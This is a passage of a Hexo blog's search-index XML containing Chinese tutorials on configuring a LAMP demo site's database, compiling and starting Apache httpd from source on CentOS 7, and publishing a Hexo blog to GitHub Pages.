/var/www/html/sys/config.php 修改账户密码为自己数据库的账户密码，保存退出即可 浏览器访问一下，出现如下错误：这是因为我们数据库中没有vauditdemo这个数据库，进入mysql创建一个就可以了： 浏览器再次访问：成功访问！ 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>lamp,搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[源码安装httpd]]></title>
    <url>%2F2018%2F12%2F04%2F%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85httpd%2F</url>
    <content type="text"><![CDATA[本文介绍了如何在linux（centos7）中通过httpd的源代码安装httpd服务 ssh连接虚拟机 注：为什么要用ssh操作虚拟机，优点如下： 界面美观 可以进行复制粘贴操作 安全 … 我使用的软件为：Termius界面如图所示：点击右下角NEW HOST，弹出如下界面： label： 起个别名 address： 在虚拟机里面输入命令ifconfig查看自己的ip地址 username： 用户名 password： 密码 点击save保存，之后双击即可连接如果双击后有提示框弹出，点击确定即可 把httpd文件拷贝进centos7中在Apache官网下载好源码后，使用这个软件进行真实机与虚拟机之间的文件拷贝打开软件，点击左上角新建连接，填好内容后点击连接即可点击允许之后看到的内容和在虚拟机之中使用ls命令看到的内容是一样的把要安装的httpd的压缩文件直接拖入小黄鸭中，等待完成即可 开始在Termius中远程安装在开始之前，需要进行一个很重要的操作，安装开发者工具集： yum groupinstall &quot;development tools&quot; 安装这个工具集的目的是为了能执行一些编译之类的命令，博主现在还不太懂装完之后长这个样子：之后开始安装：解压： tar zxvf httpd-2.4.37.tar.gz 进入到解压后的目录中，有一个INSTALL文件，通过小黄鸭（cyberduck）传到真实机上面通过编辑器打开：红框中的内容为安装所需操作步骤，后面大写的PERFIX为路径，写上你想安装的路径即可 执行第一个命令./configure --prefix=/usr/local/apache2 /usr/local/apache2为路径，自己想装在哪儿装哪儿就完事儿了出错：APR未找到，那么我们来找一下 yum search apr 把里面所有文件装上即可，执行命令： yum install apr-devel apr-util-devel apr-util apr -y 解释：通过yum install同时安装四个文件，文件不需要写全后缀，linux会自动补全，把所有类型的前缀都安装上，一共就这四种，最后的-y参数是在遇到让你输入y/n的时候自动输入y解决掉错误，继续执行第一个命令： ./configure --prefix=/usr/local/apache2 再次出错：找一下pcre： yum search pcre 同上，执行命令： yum install pcre-devel pcre2-devel pcre pcre2 -y 又解决一个错误，继续执行第一个命令： ./configure --prefix=/usr/local/apache2 执行第二条命令make 输入后它会执行好多内容，等待一会儿即可 执行第三条命令make install 输入完执行，然后等待即可到这里httpd就安装完成了 执行第四条命令/usr/local/apache2/bin/apachectl start 解释：这条命令的作用是开启httpd服务出现这个错误无关紧要，不用管：OK，成功开启 访问首先需要关闭防火墙才能在局域网其他主机访问： systemctl stop firewalld 之后在浏览器中输入ip地址:80即可访问 放入站点文件把我的博客源码放入apache安装目录下的htdocs文件夹中，通过小黄鸭（cyberduck）直接进行拖拽即可 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>源码安装,httpd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建GitHub博客]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[注：本文操作系统环境为windows 安装前提Nodejs : 官网下载就完事儿了，默认安装Git : 官网下载，安装的时候勾选上可以在cmd中运行即可 文本解释器Visual Studio Code(推荐)或者Sublime Text 安装hexowin+R打开输入cmd，执行命令: npm install -g hexo-cli 目的：安装hexo 新建文件夹存储此项目我的文件夹命名为myblog，在文件夹内打开cmd窗口，执行命令： hexo init . 目的：初始化 修改配置文件把myblog文件夹用visual studio code打开，打开_config.yml配置文件修改红框中的内容，注意：属性与值之间有空格，例： language: ZH-CN url后续再做更改 GitHub创建并登录GitHub，之后点击右上角+号，新建一个存储库New repository之后点击Create repository就完事儿了初始界面大致长这个样子：选择create new file新建一个文件 下载静态文件并且完成本地访问由于在github中直接新建文件存在各种局限性，所以通过本地写会更方便一些在myblog文件夹中打开cmd命令行窗口，执行命令： hexo generate 目的：更新静态文件，hexo程序直接帮你写好初始化静态网页本地访问： 本地访问可以方便的看到文件在浏览器中的具体样子，便于修改 同步本地文件至github打开github desktop并登录选择clone a repository选择存储库，设置本地路径，点击clone把写好的文件放入上一步设置的路径中,打开github desktop选择要上传的文件，点击commit to master进行上传同步： 主题更改找主题：themes下载主题： 1. 复制文件路径： 在myblog/themes文件夹中打开cmd窗口,执行命令： git clone 主题路径 在myblog文件夹中用编辑器打开_config.yml，修改theme值为你的主题名 清空旧网站文件，生成新网站文件在myblog文件中打开cmd命令行窗口，执行命令： hexo clean 目的：清除旧网站文件（public文件夹） hexo generate 目的：生成新网站文件（public文件夹）如果想在本地访问，可执行命令： hexo server 目的：开启本地服务器然后在浏览器地址栏输入localhost:4000即可 上传主题在github存储库的文件夹中删除所有文件（.gt隐藏文件不要删），把myblog文件夹中的public文件夹中的所有内容复制到github存储库文件夹中在github desktop中添加摘要和描述，点击commit to master即可同步： 如何在博客里面写文章在myblog文件夹中打开cmd命令行窗口，执行命令： hexo new &quot;filename&quot; 屏幕会输出文件保存路径在myblog文件夹中打开vscode，打开上述图片位置，写入内容，保存即可更新网站文件：在myblog文件夹中打开cmd，执行命令： hexo generate 目的：更新本地public文件夹把myblog/public文件夹中的内容复制到github存储库的本地文件夹中，通过github desktop上传并同步即可 错误说明原因：github desktop的本地存储库文件夹中的.gt隐藏文件不能删除 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>GitHub,博客,搭建</tag>
      </tags>
  </entry>
</search>
